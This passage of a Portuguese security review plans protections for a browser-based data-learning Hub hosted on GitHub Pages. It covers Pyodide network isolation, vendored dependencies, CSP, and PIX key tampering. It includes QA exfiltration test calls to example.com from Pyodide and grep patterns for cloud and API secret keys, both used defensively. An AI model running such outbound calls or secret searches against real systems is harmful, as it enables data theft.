2. **`micropip` não é carregado nem exposto.** Pacotes só os que o Hub empacotar e hospedar com hash (lista fechada, ex.: o núcleo e pandas/numpy se forem necessários). Mensagem "pacote indisponível" (já em hub-ux 5.4) para o resto. Verificar se o `micropip` faz parte do pacote base ou é opcional na versão fixada **[NÃO VERIFICADO]**; se vier junto, removê-lo do conjunto hospedado.
3. `indexURL` aponta para o diretório autohospedado; nenhum pacote vem de CDN ou PyPI (consistente com D3 e com a regra de integração externa).
4. **Aviso permanente e honesto na página do laboratório, em PT e EN:** (a) "Seu arquivo e seu código ficam no navegador"; (b) "Só execute código que você entende. Código copiado de outras pessoas pode tentar enviar seus dados para a internet"; (c) se a estratégia A/B passar nos testes, "O acesso à rede é bloqueado neste laboratório"; se não passar, **não escrever a frase (c)** e manter o aviso (b) bem visível. O aviso deve ser verdadeiro: o texto precisa refletir o resultado do teste, não a intenção.
5. Botão "Parar" termina e recria o Worker. Limite de tempo configurável (padrão alto o suficiente para ensino, com máximo). Limite de memória: o navegador não oferece limite configurável; mitigar com limite de tamanho do arquivo e `try/catch` no reinício.
6. Código do usuário nunca é executado no thread principal nem com `eval` do Hub. `pyodide.runPython`/`runPythonAsync` só dentro do Worker.
7. **Sem execução automática de código vindo de URL, de hash, de `localStorage` ou de JSON de conteúdo.** Exemplos do próprio Hub carregam no editor e esperam o clique do usuário.
8. Saída: `textContent` (seção 2.1). Gráficos: se vierem como imagem PNG em `data:` URL, aceitar apenas `image/png` gerado pelo Worker e inserir como `<img>` (atributo `src` com prefixo fixo validado); nunca SVG vindo do usuário em `innerHTML`.
9. `input()` desativado na v1 (hub-ux 5.4 já prevê), para não pedir senha em campo falso.

**Testes para o QA (Python):** com a aba Network aberta, executar `from pyodide.http import pyfetch; await pyfetch("https://example.com/?d=x")`, `import js; await js.fetch("https://example.com/")`, `js.WebSocket.new("wss://example.com")`, `import micropip; await micropip.install("requests")`, e `js.eval("fetch('https://example.com')")`. Resultado esperado: nenhuma requisição a `example.com` aparece na aba Network e o código recebe erro. Repetir após `new Worker(blobUrl)` aninhado e `await js.eval("import('https://example.com/x.js')")`. Qualquer requisição de saída é falha bloqueante da Fase 4 e muda a redação do aviso. (`example.com` é domínio reservado para exemplos; não envia dado de nenhum usuário real.)

---

## 5. Dependências e cadeia de suprimentos

### 5.1 Inventário proposto e estado da verificação

| Biblioteca | Versão proposta | Origem do dado | Licença | Advisories conhecidos |
|---|---|---|---|---|
| sql.js | 1.15.0 | [S] API jsDelivr, citada em `technology-stack.md` (não reproduzida; C8) | **NÃO VERIFICADO** (suposta MIT) | **NÃO VERIFICADO** |
| Papa Parse | 5.7.1 | idem [S] | **NÃO VERIFICADO** (suposta MIT; `LICENSE` de 1.079 bytes existe, conteúdo não lido) | **NÃO VERIFICADO** |
| Pyodide | 314.x (a fixar) | blog oficial via espelho, citado no stack | **NÃO VERIFICADO** (suposta MPL-2.0) | **NÃO VERIFICADO** |
| DuckDB-WASM | fora da v1 | `latest` aponta para build `dev` [S, via stack] | **NÃO VERIFICADO** | **NÃO VERIFICADO** |
| Fontes (3 famílias) | n/a | n/a | **NÃO VERIFICADO** (suposta OFL) | n/a |

Estado atual do repositório [C]: não há `package.json`, nem `node_modules` rastreado (`.gitignore` os ignora), nem dependência de terceiros em JavaScript no portfólio. A única dependência externa em tempo de execução é o CSS do Google Fonts (SEC-14). Isso é um ponto forte e deve ser preservado.

### 5.2 Requisitos para trazer uma biblioteca para `hub/assets/vendor/`

1. **Origem rastreável.** Baixar do registro oficial (npm tarball ou release do projeto) e registrar URL, data, versão exata e o hash de integridade publicado pelo registro; conferir se bate com o SHA-256 calculado localmente. A fonte do arquivo (jsDelivr ou outra) não é prova de autenticidade por si só.
2. **`manifest.json`** (já previsto): `name`, `version`, `license`, `sourceUrl`, `sha256`, `sizeBytes`, `verifiedOn`. Acrescentar `advisoryCheck` (data e fonte da consulta) e `files` (apenas os necessários; remover `.map`, debug, `asm.js` e testes).
3. **Licença lida no arquivo original** e texto da licença copiado para a pasta. Só entram licenças permissivas aprovadas (a lista da seção 9 do Architect: MIT, BSD, Apache-2.0, MPL-2.0, OFL); MPL-2.0 exige manter os arquivos MPL com aviso e fonte disponível [S]; fontes OFL: não vender isoladamente e manter o texto da licença [S].
4. **Consulta de advisories** antes de cada versão (GitHub Advisory Database, OSV, avisos do projeto). Registrar resultado, inclusive "nenhum encontrado em AAAA-MM-DD". Reavaliar a cada trimestre (já previsto em R8).
5. **Verificação de integridade no carregamento.** Em `loader.js`, calcular `crypto.subtle.digest("SHA-256", bytes)` do `.wasm` e do script antes de instanciar ou criar o Worker e comparar com o `manifest.json`. Em `fetch()` é possível usar `{ integrity: "sha256-..." }` [S]. **Honestidade sobre o limite:** como o manifest vive no mesmo repositório e no mesmo site, isso detecta corrupção, cache sujo e troca parcial, mas **não** protege contra quem consegue alterar o repositório inteiro (arquivo e manifest juntos). Por isso o controle de acesso ao repositório (seção 8) faz parte da defesa.
6. **Sem script de terceiros em `<script src>` externo.** Se algum dia houver exceção de CDN, valem as regras 5.3.
7. **Atualização deliberada:** novo diretório com a versão no nome (`sql.js@1.15.0/`), PR próprio, revisão do Security Auditor. Sem Dependabot para arquivos copiados (ele não os monitora); o acompanhamento é manual e trimestral.
8. **Peso no Git:** commit de WASM é permanente no histórico (Architect, seção 6.3). Não há como "desfazer" a inclusão de um binário vulnerável; ele continua nas versões antigas do histórico e em forks.

### 5.3 CDN e SRI (apenas se D3 for exceção)

- SRI (`integrity`) funciona em `<script>` e `<link>` e exige `crossorigin="anonymous"` para recursos de outra origem [S]. Não protege arquivos carregados por `fetch` dentro do Pyodide sem passar `integrity`, nem os pacotes que o Pyodide baixa depois do núcleo (cada um precisaria de hash próprio; o `pyodide-lock.json` contém hashes por pacote [S, **NÃO VERIFICADO**]).
- Versão **fixa e exata** (nunca `latest`, `next`, `@5`, `@^1`). O stack já aponta que `latest` do DuckDB-WASM é build de desenvolvimento [S via stack].
- Qualquer CDN é serviço externo: exige os oito campos do `infrastructure-costs.md` seção 6 e a aprovação do Lucas, e a CSP `script-src`/`connect-src` passa a listar o domínio, o que enfraquece a política.

### 5.4 Arquivos próprios e o portfólio atual

[C] O portfólio não usa SRI, porque não carrega scripts externos. [C] O CSS do Google Fonts é carregado sem `integrity` (CSS de fonte dinâmico por User-Agent não pode ter SRI estável [S]); a solução é autohospedar (SEC-14), não aplicar SRI.

---

## 6. `localStorage` e armazenamento

**Fatos [C]:** chaves `ld-theme` (`app.js` linhas 154-155; `certificacoes.html` linhas 641-645) e `ld-lang` (`i18n.js` linhas 90-94 e 139). O `i18n.js` valida `ld-lang` (`"pt"` ou `"en"`), mas o código de tema **não valida** `ld-theme`: `document.documentElement.dataset.theme = t` aceita qualquer texto. Hoje o efeito é nulo (só um seletor CSS), mas o Hub não deve copiar esse padrão sem validar (`light` ou `dark`).

**Riscos e requisitos.** Escopo do MVP (C6): só `ld-lang`, `ld-theme` e o que o Hub realmente precisar, sempre validado. Os itens sobre rascunho, convite e progresso abaixo ficam **adiados (P2), a reavaliar quando formalizados**; não geram requisito nem teste no MVP.

1. **Mesma origem [S, comportamento geral do GitHub Pages]:** todos os sites de projeto de `luudelfino91-lgtm.github.io` compartilham `localStorage`. Qualquer XSS em qualquer deles lê e grava as chaves do Hub. Prefixo `hub-` evita colisão acidental, **não** isola.
2. **O que pode ser guardado (MVP):** tema e idioma, com valor validado. **Adiado (P2):** ID de exercício concluído, progresso de curso, dispensa do convite de apoio, rascunho de código. **Não pode ser guardado:** conteúdo de arquivo, linhas de resultado, nomes de coluna do usuário, o `File`, qualquer coisa de PIX além de uma bandeira "dispensou" (se formalizada).
3. **Rascunho de código (P2, adiado, reavaliar quando formalizado)** é dado do usuário e pode conter dado sensível (um `INSERT` com valores reais, uma senha colada). Se formalizado, requisitos mínimos: aviso na tela, botão "Limpar", opção de desligar, limite de tamanho, sem sincronização.
4. **Ler com defesa:** `try/catch` em todo acesso (já é o padrão do portfólio), `JSON.parse` dentro de `try`, validar tipo e tamanho, usar lista de valores permitidos, nunca inserir o valor em HTML (seção 2.1).
5. **Cota e indisponibilidade:** o armazenamento pode estar desativado (modo privado) ou cheio; a ferramenta funciona sem ele.
6. **Retenção (P2, adiado):** a dispensa do convite "por 30 dias" guardaria uma data, sem dado pessoal. Reavaliar quando formalizada.
7. **IndexedDB/OPFS** (citados no Architect para dados do usuário): mesma observação de origem; se usados, o aviso de privacidade os cita, o usuário pode limpar, e não guardam arquivo além da sessão sem consentimento claro.
8. **Cookies:** o Hub não define nenhum cookie [S, a confirmar por inspeção no DevTools]. O portfólio atual também não [C: nenhum `document.cookie` nos arquivos lidos].

---

## 7. CSP via `<meta>` no GitHub Pages: o que cobre e o que não cobre

**Contexto.** O GitHub Pages não permite configurar cabeçalhos HTTP [S, amplamente conhecido; **NÃO VERIFICADO** nesta sessão, consta como P3 do Architect]. A alternativa é `<meta http-equiv="Content-Security-Policy" content="...">`.

**O que a CSP por `<meta>` cobre [S, especificação CSP; testar]:** `script-src`, `style-src`, `img-src`, `font-src`, `connect-src`, `media-src`, `object-src`, `base-uri`, `form-action`, `worker-src` (para Workers criados pela página), `default-src`, `frame-src`, `manifest-src`. Vale para o documento que contém a `<meta>`, a partir do ponto em que ela aparece.

**O que NÃO cobre ou cobre de forma limitada [S]:**

| Limitação | Efeito neste projeto |
|---|---|
| `frame-ancestors`, `report-uri`/`report-to` e `sandbox` são ignorados em `<meta>` | Não dá para proibir que a página seja embutida em outro site (SEC-20) nem receber relatórios de violação (e relatório seria um serviço externo). |
| Aplica-se só depois da `<meta>` | A `<meta>` precisa ser o **primeiro elemento do `<head>`**, antes de qualquer `<script>`, `<link>` ou `<img>`. |
| Cada página precisa da sua `<meta>` | Páginas sem a tag ficam sem proteção. Verificação por QA em todas as páginas do Hub. |
| Workers criados de URL `https:` podem não herdar a CSP da `<meta>` (herdam a dos cabeçalhos do script) | **Principal incerteza.** Afeta SEC-01 (seção 4A). **NÃO VERIFICADO**, exige teste em site publicado. |
| Sem cabeçalhos de segurança complementares (`X-Content-Type-Options`, `Permissions-Policy`, `Referrer-Policy` real, COOP/COEP, HSTS próprio) | `Referrer-Policy` e outras podem ser parcialmente emuladas com `<meta name="referrer">`; o resto não. HTTPS é fornecido pelo GitHub Pages; ativar "Enforce HTTPS" no repositório [S, configuração do Lucas; **NÃO VERIFICADO**]. |
| A origem compartilhada (`github.io/usuario`) não é isolada por CSP | Uma política `connect-src 'self'` ainda permite requisições a outros sites de projeto da mesma origem; sem impacto de exfiltração para um terceiro, mas relevante para SEC-10. |
| O portfólio atual usa `<script>` inline (`index.html` linha 221, `certificacoes.html` linhas 619, 634, 639), `onclick` inline e `style=""` | **Uma CSP estrita não pode ser aplicada ao portfólio sem editá-lo** (D4 proíbe). A CSP vale para o Hub. [C] |

**Proposta de política inicial para as páginas do Hub (a testar, não é definitiva):**

```
default-src 'none';
script-src 'self' 'wasm-unsafe-eval';
style-src 'self';
img-src 'self' data: blob:;
font-src 'self';
connect-src 'self';
worker-src 'self' blob:;
manifest-src 'self';
base-uri 'none';
form-action 'none';
object-src 'none'
```

Observações:

- `'wasm-unsafe-eval'` é necessário para instanciar WASM [S]. O Pyodide pode exigir também `'unsafe-eval'` (usa `eval`/`new Function` internamente [S, **NÃO VERIFICADO**]). Se for necessário, restringir **somente** à página do Python e, de preferência, ao iframe sandbox (estratégia 4B), e nunca nas demais páginas do Hub.
- Sem `unsafe-inline`: o Hub não pode ter `<script>` inline, handlers `onclick=` nem atributos `style=""` no HTML. A arquitetura já prevê `theme-init.js` externo e `pt.hub.js` externo; o `window.PAGE_META` do portfólio é um script inline e **não** pode ser copiado para páginas do Hub. Estilos dinâmicos devem usar a CSSOM (`el.style.prop = ...`, permitido) e classes, não `setAttribute("style", ...)`. O `styles.css` do portfólio é arquivo externo, ok.
- Fontes locais (`font-src 'self'`) eliminam `fonts.googleapis.com` e `fonts.gstatic.com` da política (consistente com SEC-14).
- Vídeos (`frame-src`), se aprovados, só na página que os usa e só para o domínio aprovado.
- **Teste de aceitação:** abrir cada página do Hub com o Console aberto; nenhuma violação de CSP em uso normal; o teste de exfiltração da seção 4 gera violação de CSP ou erro de rede; um `<img src="https://example.com/x.png">` injetado via DevTools é bloqueado.
- **A CSP é uma segunda linha de defesa.** A primeira é não inserir HTML com dado do usuário (seção 2.1).

---

## 8. PIX, golpes e termos do GitHub Pages

### 8.1 Verificações feitas

**Status (A6, C2):** PIX e D5 são **provisórios até a Fase 6**. Nada nesta seção presume que D5 foi aprovado nem que a chave, o formato ou a página existirão; as mitigações abaixo valem "se D5 aprovado". O risco de chave trocada (SEC-13) permanece mesmo assim, porque o repositório é público e clonável.


- [C] Não existe chave PIX no repositório atual (busca da seção 9; as únicas ocorrências de "PIX" são texto descritivo de projetos em `data.js` e `data-en.js`). O design deixa a chave como `[chave PIX a definir pelo Lucas]` (`hub-ux.md` seção 9.6).
- [S, **NÃO VERIFICADO**] Página oficial de limites do GitHub Pages (https://docs.github.com/en/pages/getting-started-with-github-pages/github-pages-limits), lida nesta rodada (2026-11-12) apenas por ferramenta que resume a página; sem trecho literal colado, e nova tentativa de leitura direta foi barrada (403). Rebaixado de [V] por C10.5 N6. O texto abaixo é resumo, não cópia. Conteúdo: o Pages "not intended for or allowed to be used as a free web-hosting service to run your online business, e-commerce site, or any other website" centrado em atividade comercial; sites "shouldn't be used for sensitive transactions like sending passwords or credit card numbers". **A página não menciona doações.** Limites lidos: site publicado até 1 GB; repositório de origem, limite recomendado de 1 GB; deploy expira após 10 minutos; banda, limite flexível de 100 GB por mês; builds, limite flexível de 10 por hora (não vale com workflow próprio do GitHub Actions). Para uso contratual, o Lucas deve ler a página original.
- **NÃO VERIFICADO:** os "GitHub Terms for Additional Products and Features" (seção sobre GitHub Pages), que são o texto contratual. Nova tentativa nesta rodada também foi barrada. Não afirmo o que eles dizem sobre doações. Por C8, a conclusão "custo recorrente US$ 0" permanece condicionada a essa leitura.
- **Interpretação (minha, [S], não é parecer jurídico):** uma página de contribuição voluntária, sem venda, sem paywall e com conteúdo gratuito é diferente de e-commerce, mas **o risco de questionamento existe e a decisão é do Lucas** (R2 do Architect). A mitigação de design (discreto, secundário, sem contrapartida) é adequada. Plano de migração em `infrastructure-costs.md` seção 5.

### 8.2 Riscos específicos do PIX com chave pública

1. **Exposição de dado pessoal (SEC-12).** CPF, telefone e e-mail como chave identificam o Lucas e são permanentes no histórico do Git (inclusive em PRs e forks). Chave aleatória (EVP) expõe menos [S]. O payload "copia e cola"/QR estático também carrega nome e cidade do recebedor [S, padrão BR Code do Banco Central; **NÃO VERIFICADO**]. O app do pagador costuma mostrar o nome do recebedor [S]; essa exibição é desejável para o apoiador conferir (hub-ux já prevê). Decisão do Lucas: qual chave e quais nome e cidade publicar. Registrar a decisão em `decision-log.md` antes do commit.
2. **Troca de chave por adulteração (SEC-13).** O ataque é simples: alterar uma string no repositório. Como não há backend nem monitoramento, ninguém percebe até que alguém reclame. Controles recomendados:
   - Conta GitHub do Lucas com autenticação em duas etapas, preferencialmente passkey ou chave de segurança [S: configuração do Lucas; **NÃO VERIFICADO** se já está ativa].
   - Proteção do ramo `main`: PR obrigatório (mesmo para o dono, D6 já prevê PR), sem push direto, sem force-push. Configuração no GitHub; **NÃO VERIFICADO** se está ativa.
   - `CODEOWNERS` marcando os arquivos de PIX (página `hub/apoie/`, futuro, Fase 6, `pix.js`, imagem do QR) com o Lucas como único revisor [S].
   - Payload **estático**, pré-gerado e validado em app bancário real, em vez de montado por JavaScript em tempo de execução (menos superfície). Se for gerado em JS, o CRC16 é verificado por teste.
   - A chave "esperada" registrada em um documento fora do código (por exemplo `docs/security/` ou o `decision-log.md`, escrito pelo Lucas) e conferida no checklist de release por QA: decodificar o QR e comparar com a chave esperada.
   - Segundo canal público com a mesma chave (perfil GitHub e LinkedIn, por decisão do Lucas), para o apoiador poder conferir.
   - Sem gerador de QR de terceiros (por exemplo, serviços online de QR ou bibliotecas por CDN): enviariam a chave e o nome a terceiro e adicionariam dependência. QR gerado uma vez, localmente, e salvo como imagem.
3. **Clone e imitação.** O repositório é público; qualquer pessoa pode copiar o Hub e trocar a chave. Não há como impedir. Mitigação: o texto da página orienta a conferir nome e instituição no app antes de pagar (já em hub-ux 9.4); URL oficial exibida; não usar linguagem de urgência ou de meta que facilite golpe de imitação. Não ensinar o usuário a confiar em "qualquer QR".
4. **Falsa confirmação.** Sem backend, não há como saber se alguém pagou; **não** exibir "obrigado pela contribuição" como se fosse confirmação, nem recibo. A página não pode pedir CPF, e-mail ou comprovante (RF-16 e D5 já preveem "sem coleta").
5. **Fiscal e legal:** fora do escopo (hub-ux 9.6 já direciona ao contador). **NÃO VERIFICADO** e não avaliado.
6. **Histórico permanente:** assim que a chave entrar em um commit, remover do histórico exige reescrita e não alcança forks. Decidir antes. O PR da Fase 6 não deve conter a chave em rascunhos intermediários.

---

## 9. Segredos no repositório: busca realizada

Comandos executados em `/home/claude/portfolio` (resultados reais) [C]. **Busca original mantida.** Data de execução: 2026-11-12, sobre o HEAD `c236e9d` da branch `feat/phase-1-planning` (2 commits no histórico); os documentos novos em `docs/` ainda não rastreados faziam parte do working tree. O padrão do item 1 foi repetido em 2026-11-12 na rodada de reconciliação (working tree, sem `.git`), de novo sem correspondências; os demais itens não foram repetidos.

1. `grep -rInE` no working tree (excluindo `.git`) com os padrões: `AKIA[0-9A-Z]{16}` (AWS), `ghp_[A-Za-z0-9]{20,}` e `github_pat_[A-Za-z0-9_]{20,}` (GitHub), `sk-[A-Za-z0-9]{20,}`, `xox[baprs]-...` (Slack), `AIza[0-9A-Za-z_-]{35}` (Google) e `-----BEGIN [A-Z ]*PRIVATE KEY-----`. **Resultado: nenhuma correspondência.**
2. `grep -rInEi` por `(api[_-]?key|secret|token|passw(or)?d|senha|bearer|authorization)\s*[:=]`. **Resultado: nenhuma correspondência.**
3. Busca por `pix`, `chave` e padrão de CPF `[0-9]{3}\.[0-9]{3}\.[0-9]{3}-[0-9]{2}` fora de `docs/`. **Resultado: nenhum CPF e nenhuma chave PIX.** As ocorrências são texto descritivo ("o PIX lidera com R$ 707 mil" em `data.js` e `data-en.js`) e a palavra "chave" em `README.md` linha 13 ("Apresentação, foto, selo PL-300 e números-chave").
4. `git ls-files` filtrado por extensões e nomes `.env`, `.pem`, `.key`, `.p12`, `.pfx`. **Resultado: nenhum arquivo rastreado.**
5. `git log -p --all` (excluindo imagens) filtrado pelos mesmos padrões do item 1. O repositório tem **2 commits**. **Resultado: nenhuma correspondência.**
6. `.gitignore` [C] contém `.DS_Store`, `Thumbs.db`, `.vercel`, `node_modules/`, `*.pbix`. Não contém `.env`, `*.pem`, `*.key`, `*.csv` nem `*.xlsx`.

**Dados pessoais públicos já existentes [C]:** o e-mail `lucasdelfino91@hotmail.com` em `index.html` (linha 205), links de LinkedIn e GitHub, e URLs de verificação de credenciais em `certificacoes.html` (por exemplo, link de PDF de certificado em S3 e links de verificação da Microsoft e de plataforma de cursos). São públicos por decisão do portfólio; o e-mail está exposto a coleta automática por robôs de spam (risco baixo, aceito pelo Lucas, nenhuma ação proposta).

**Limites desta busca:** é `grep` simples sobre texto; não detecta segredos em binários (imagens), segredos sem padrão conhecido, nem ofuscados; **não** substitui uma ferramenta dedicada (gitleaks, trufflehog) e o GitHub Secret Scanning do repositório **não foi consultado** (**NÃO VERIFICADO** se está ativo; é gratuito em repositório público [S]). Recomendação: o Lucas ativa o Secret Scanning e o push protection nas configurações do repositório (ação do Lucas, não integração externa de terceiros).

**Requisitos para o futuro:**

- Nenhuma chave de API, token ou senha no repositório: não há backend (D8), logo não deve haver nenhum. Qualquer valor que "pareça chave" no Hub é um defeito a investigar.
- Estender `.gitignore` com `.env`, `*.pem`, `*.key`, `*.pfx` (sugestão; o arquivo é de configuração do projeto, a edição fica com o Tech Lead).
- Antes de cada PR do Hub: repetir os comandos 1, 2 e 4 acima nos arquivos novos, e conferir manualmente datasets e planilhas (metadados incluídos, SEC-16).

---

## 10. Google Fonts no site atual

- [C] `index.html` linhas 26-28 e `certificacoes.html` linhas 22-24: `preconnect` a `fonts.googleapis.com` e `fonts.gstatic.com` e `<link rel="stylesheet">` para o CSS do Google Fonts. [C] `styles.css` não tem `@import` nem `url(` externo (busca realizada).
- [S] Cada visita faz o navegador contatar servidores do Google, expondo o IP, o User-Agent e o Referer ao Google. **NÃO VERIFICADO** nesta sessão na política de privacidade do Google Fonts.
- [S, **NÃO VERIFICADO**] Houve decisão de um tribunal alemão (Munique, 2022) considerando ilícito o carregamento de Google Fonts de servidores do Google sem consentimento, por transmitir o IP do visitante. Cito de memória, sem fonte lida; o Lucas deve pedir confirmação jurídica antes de tratar como precedente. O público do portfólio inclui a Irlanda e a União Europeia (vagas), então o GDPR é relevante [S].
- **Recomendação:** autohospedar as fontes (woff2, subconjunto latino, texto da licença OFL junto), como o Architect já propõe para o Hub. Para o portfólio atual, a troca altera `index.html` e `certificacoes.html`: **exige aprovação do Lucas** (D4). Até lá, o risco permanece e deve ser registrado na página de privacidade do Hub como existente no portfólio.
- O Hub, com `font-src 'self'` e `style-src 'self'`, não contata o Google; verificar na aba Network.

---

## 11. Privacidade, LGPD e analytics

**Recomendação (a decisão é do Lucas): sem analytics.** Razões: o PRD já assume RNF-03 (sem analytics de terceiros, "confirmar com Lucas"); o Hub não tem backend; qualquer analytics é serviço externo (regra de integração e de custo); o IP do visitante é considerado dado pessoal na LGPD e no GDPR [S, **NÃO VERIFICADO** em texto legal]; e a promessa "seu arquivo não sai do seu computador" é mais forte sem nenhum script de medição ao lado.

Se o Lucas quiser alguma medida, opções, **sem escolha feita por mim**, todas exigindo o dossiê de oito campos (`infrastructure-costs.md` seção 6) e aprovação:

| Opção | Observação |
|---|---|
| Nenhuma medida (recomendada) | Zero risco novo. Sucesso medido por sinais qualitativos (estrelas, mensagens). |
| Estatísticas do próprio GitHub (tráfego do repositório) | Não é analytics do site e não inclui visitantes do Pages [S, **NÃO VERIFICADO**]; só dá noção do repositório. Sem script. |
| Contador simples sem cookies, de terceiro (existem serviços que não usam cookies nem identificam o visitante individualmente) | Ainda é serviço externo: o IP chega ao operador mesmo que ele não o guarde [S]; verificar política, jurisdição, retenção; CSP `script-src` e `connect-src` precisam listar o domínio; **não escolho um.** |
| Contador sem cookies autohospedado | Exige backend; contraria D8. Descartar. |

Se houver analytics: nenhuma medição dentro das ferramentas (nunca conteúdo, nome de arquivo, tamanho exato, texto de consulta); página de privacidade atualizada; cookie banner só se houver cookie ou armazenamento no dispositivo [S].

**Texto de privacidade do Hub (Technical Writer redige; a verificar na implementação):** o que roda no navegador; o que é guardado localmente (tema, idioma, rascunho, progresso); que o GitHub, operador do Pages, pode registrar acessos [S, política do GitHub **NÃO VERIFICADA**]; que o portfólio atual carrega fontes do Google (SEC-14); e que links externos levam a sites com suas próprias políticas.

**Coleta mínima:** o Hub não tem formulário, login nem contador. O `mailto:` do portfólio abre o cliente de e-mail do usuário; não há coleta pelo Hub. Não adicionar formulário de contato com serviço terceiro (já fora do escopo, D8).

---

## 12. Conteúdo, downloads e links externos

- **Datasets de exemplo e recursos** (RF-09, RF-14): somente dados sintéticos ou de licença pública explícita, com a fonte registrada. **Nenhum dado real de clientes, devedores ou da empresa em que o Lucas trabalha** (domínio de crédito e cobrança: CPF, nomes, valores de dívida). Verificação: inspeção do arquivo por amostragem e busca por padrões de CPF, e-mail e telefone antes de commitar. O `.gitignore` atual bloqueia `*.pbix` (bom), mas não CSV nem planilhas.
- **Arquivos Office:** evitar macros (`.xlsm`, `.xlam`, VBA). Planilhas e modelos sem macro; metadados de autoria e caminhos internos removidos antes de publicar (a inspeção de documentos do Office ou equivalente; **NÃO VERIFICADO** o método).
- **Integridade:** listar SHA-256 ao lado de cada download; o `Baixar` aponta para arquivo do próprio repositório (mesma origem), não para links encurtados.
- **Links externos** (cursos, IA): `target="_blank"` sempre com `rel="noopener noreferrer"` (o portfólio já usa `rel="noopener"` [C]; acrescentar `noreferrer` no Hub é opcional para privacidade). Revisão trimestral dos links (domínio expirado pode ser comprado por terceiro). Não exibir pré-visualizações de sites externos nem carregar `<iframe>`.
- **Vídeo** (hub-ux 5.6, "clique para carregar"): mesmo com clique, o iframe de um provedor envia o IP do visitante ao provedor e exige relaxar `frame-src`. Alternativa sem integração: link para o vídeo, ou arquivo de vídeo próprio (peso no repositório). **Exige aprovação do Lucas.** Se aprovado: `sandbox`, `referrerpolicy="no-referrer"`, `loading="lazy"` e a CSP relaxada só naquela página.
- **IA** (RF-15): conteúdo estático. Nenhum campo "cole seus dados aqui" ligado a API. Se um prompt copiável sugerir colar dados em ferramentas de IA de terceiros, incluir aviso: "Não cole dados pessoais ou confidenciais em ferramentas de IA online." Este aviso protege o usuário e a regra do projeto sobre dados enviados a terceiros.

---

## 13. Recomendações de correção (consolidadas e priorizadas)

| # | Recomendação | Risco | Quando | Aprovação |
|---|---|---|---|---|
| 1 | Prototipar e testar o bloqueio de rede do Python (estratégias A e B da seção 4) em um site publicado de teste antes de afirmar na interface que a rede está bloqueada; sem `micropip`; lista fechada de pacotes autohospedados | SEC-01 | Fase 4 (antes de qualquer commit do Pyodide) | Arquitetura: Lucas (D3) |
| 2 | Adotar a regra de renderização: só `textContent`; nenhum dado do usuário dentro de `[data-i]`; sem `innerHTML` com dado do usuário; ESLint não existe (sem build), então a verificação é busca textual obrigatória no PR: `grep -nE "innerHTML|outerHTML|insertAdjacentHTML|document\.write|eval\(|new Function"` em `hub/` | SEC-02, SEC-03 | Fase 2 em diante | Não |
| 3 | Citar identificadores e parametrizar valores; nomes internos fixos para tabelas e colunas gerados do CSV; nome fixo de arquivo no Pyodide | SEC-04 | Fase 3 | Não |
| 4 | Exportação protegida contra fórmulas por padrão | SEC-05 | Fase 3/4 | Não |
| 5 | Limites: tamanho de arquivo antes de ler, timeout por término do Worker, limite de linhas lidas e exibidas, tratamento de falha de memória | SEC-06, SEC-07 | Fase 3 (MVP, CSV e SQL) e Fase 4 | Limite numérico: Lucas |
| 6 | `hub/assets/vendor/manifest.json` com origem, hash, licença lida e consulta de advisories; verificação de hash no `loader.js`; consulta trimestral | SEC-08 | Fase 2 (estrutura), cada biblioteca | Licença e versão: Lucas |
| 7 | CSP por `<meta>` em todas as páginas do Hub, como primeiro elemento do `<head>`, sem inline; testar herança em Workers | SEC-11, SEC-01 | Desde a Fase 2 (política mínima), Fase 7 (endurecida) | Não |
| 8 | Decidir a chave PIX e o que publicar (nome, cidade) antes de qualquer commit; 2FA e proteção do `main`; CODEOWNERS; payload estático; chave esperada em documento; conferência no release; segundo canal | SEC-12, SEC-13 | Fase 6 (provisório até lá, ver A6) | **Lucas decide** |
| 9 | Autohospedar fontes no Hub (já previsto); decidir sobre o portfólio | SEC-14 | Fase 2 (Hub); portfólio depende do Lucas | **Lucas aprova** (altera páginas atuais) |
| 10 | Sem analytics; se houver, dossiê de oito campos | SEC-15 | Fase 0 | **Lucas decide** |
| 11 | Ativar Secret Scanning e push protection; estender `.gitignore` | SEC-17 | Agora | Lucas (configuração do repositório); Tech Lead (`.gitignore`) |
| 12 | Datasets sintéticos; metadados limpos; sem macros; SHA-256 nos downloads | SEC-16 | Fase 5 | Não |
| 13 | Página de privacidade verdadeira, escrita só depois de a implementação existir | todos | Fase 2 (versão inicial, P1) e revisão na Fase 7 | Lucas lê |
| 14 | Remover Service Worker do plano se a CSP e o teste de herança não estiverem resolvidos; senão, escopo `hub/` e cache versionado | SEC-19 | Fase 7 | Lucas (item opcional) |

---

## 14. Requisitos de segurança para QA e Developer

Cada requisito é verificável. `SR-xx` pode ser citado em PRs.

### 14.1 Requisitos para o Developer

| ID | Requisito |
|---|---|
| SR-01 | Nenhum dado do usuário é inserido com `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write` nem concatenado em HTML. Somente `textContent`, `createTextNode`, `setAttribute` e propriedades DOM. |
| SR-02 | Nenhum elemento com `data-i`/`data-ia` contém ou contém como descendente conteúdo do usuário. Dicionários (`PT_EXTRA`, `ht`) só têm strings estáticas do desenvolvedor. |
| SR-03 | Sem `eval`, `new Function`, `setTimeout`/`setInterval` com string, e sem `<script>` inline, handlers `on*=` ou atributos `style=""` nas páginas do Hub. |
| SR-04 | Páginas do Hub têm `<meta http-equiv="Content-Security-Policy">` como primeiro elemento do `<head>` com a política da seção 7 (ajustada e documentada), e nenhum domínio de terceiros. |
| SR-05 | Nenhuma requisição de rede é feita com conteúdo do usuário. Nenhum `fetch`, `XMLHttpRequest`, `sendBeacon`, `WebSocket` ou `<img>`/`<link>` com dado do usuário na URL. |
| SR-06 | Nenhum recurso de terceiros em tempo de execução (fontes, CDN, scripts, vídeo, QR) nas páginas do Hub, salvo exceção aprovada por escrito pelo Lucas. |
| SR-07 | Identificadores SQL gerados de dados do usuário são citados ou substituídos por nomes internos; valores por parâmetros. Nome de arquivo nunca entra em código gerado. |
| SR-08 | Cabeçalhos de CSV não são usados como chaves de objeto comuns (`__proto__`, `constructor`, `prototype`). Cabeçalhos duplicados e vazios tratados. |
| SR-09 | A exportação de CSV neutraliza células de texto iniciadas por `=`, `+`, `-`, `@`, TAB, CR (padrão ligado), escapa aspas, e sanitiza o nome do arquivo baixado. |
| SR-10 | `file.size` é verificado antes de ler; limites de tamanho, de linhas, de colunas e de linhas exibidas existem e são mensagens claras, nunca travamento. |
| SR-11 | **MVP (P0, C10.1):** CSV (parsing) e SQL rodam em Worker; Python segue a regra na Fase 4. Timeout e "Parar" terminam e recriam o Worker. Falhas de memória viram erro recuperável. Resultado SQL lido com limite de linhas. |
